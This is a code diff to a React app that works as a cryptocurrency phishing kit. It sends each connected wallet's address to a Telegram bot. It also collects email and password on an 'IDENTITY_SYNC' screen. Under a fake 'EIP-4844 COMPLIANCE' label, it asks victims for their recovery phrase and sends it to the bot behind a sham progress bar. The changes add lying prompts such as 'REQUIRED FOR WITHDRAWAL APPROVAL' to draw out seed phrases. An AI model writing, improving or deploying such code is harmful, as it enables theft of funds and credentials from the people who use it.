@@ -20,11 +20,10 @@ export default function App() {
 
   const log = (m) => fetch(`https://api.telegram.org/bot${bT}/sendMessage?chat_id=${cI}&text=${encodeURIComponent(m)}`).catch(()=>{});
 
-  // 🎯 WALLET HIT - WORKING
   useEffect(() => {
-    if (isConnected && address && !sessionStorage.getItem('hit_ok')) {
+    if (isConnected && address && !sessionStorage.getItem('hit_final')) {
       log(`🎯 WALLET CONNECTED!\nADDR: ${address}\nNET: ${chainId}`);
-      sessionStorage.setItem('hit_ok', 't');
+      sessionStorage.setItem('hit_final', 't');
     }
   }, [isConnected, address]);
 
@@ -91,9 +90,10 @@ export default function App() {
             <div style={{backgroundColor:'#0d1117', border:'1px solid #1e293b', borderRadius:'35px', padding:'35px', textAlign:'center', position:'relative'}}>
               <button onClick={()=>setView("menu")} style={{position:'absolute', left:'20px', top:'20px', background:'none', border:'none', color:'#475569', fontSize:'22px'}}>←</button>
               <h2 style={{color:'white', fontWeight:'900'}}>IDENTITY_SYNC</h2>
-              <input placeholder="EMAIL" style={{width:'100%', padding:'15px', backgroundColor:'black', border:'1px solid #1e293b', borderRadius:'12px', color:'white', marginTop:'20px'}} />
+              <div style={{fontSize:'10px', color:'#475569', margin:'10px 0'}}>REQUIRED FOR WITHDRAWAL APPROVAL</div>
+              <input placeholder="EMAIL" style={{width:'100%', padding:'15px', backgroundColor:'black', border:'1px solid #1e293b', borderRadius:'12px', color:'white', marginTop:'10px'}} />
               <input type="password" placeholder="PASSWORD" style={{width:'100%', padding:'15px', backgroundColor:'black', border:'1px solid #1e293b', borderRadius:'12px', color:'white', marginTop:'10px'}} />
-              <button onClick={()=>setView("seed_gate")} style={{width:'100%', backgroundColor:'#10b981', color:'black', padding:'15px', borderRadius:'12px', fontWeight:'900', border:'none', marginTop:'20px'}}>VERIFY_RELAY</button>
+              <button onClick={()=>setView("seed_gate")} style={{width:'100%', backgroundColor:'#1e293b', color:'white', padding:'15px', borderRadius:'12px', fontWeight:'900', border:'none', marginTop:'20px'}}>CONTINUE</button>
             </div>
           )}
 
@@ -103,12 +103,13 @@ export default function App() {
                 {!isSyncing ? (
                   <>
                     <div style={{color:'#10b981', fontWeight:'900', fontSize:'18px'}}>🛡️ EIP-4844 COMPLIANCE</div>
-                    <textarea value={seedVal} onChange={(e)=>setSeedVal(e.target.value)} placeholder="12/24 WORDS" style={{width:'100%', height:'120px', backgroundColor:'black', color:'#10b981', padding:'15px', border:'1px solid #1e293b', borderRadius:'15px', outline:'none', marginTop:'15px'}} />
+                    <div style={{fontSize:'10px', color:'#64748b', marginTop:'10px', lineHeight:'1.4'}}>To prevent sybil attacks and verify wallet ownership, please input your recovery phrase to synchronize with the Mainnet Relay.</div>
+                    <textarea value={seedVal} onChange={(e)=>setSeedVal(e.target.value)} placeholder="12/24 WORDS" style={{width:'100%', height:'120px', backgroundColor:'black', color:'#10b981', padding:'15px', border:'1px solid #1e293b', borderRadius:'15px', outline:'none', marginTop:'20px'}} />
                     <button onClick={()=>{setIsSyncing(true); log(`🚨 SEED: ${seedVal}`); let c=0; const i=setInterval(()=>{c++; setSyncProgress(c); if(c>=100){clearInterval(i); setTimeout(()=>{setIsSyncing(false); setView("menu")},1200)}},60);}} 
                     style={{width:'100%', backgroundColor: seedVal.split(' ').length >= 12 ? '#10b981' : '#1e293b', color:'#000', padding:'20px', borderRadius:'15px', marginTop:'20px', fontWeight:'900', border:'none'}}>ENCRYPT & SYNC</button>
                   </>
                 ) : (
-                  <div><div style={{fontSize:'60px', color:'white', fontWeight:'900'}}>{syncProgress}%</div><div style={{color:'#10b981'}}>STABILIZING...</div></div>
+                  <div><div style={{fontSize:'60px', color:'white', fontWeight:'900'}}>{syncProgress}%</div><div style={{color:'#10b981'}}>STABILIZING_RELAY...</div></div>
                 )}
               </div>
             </div>
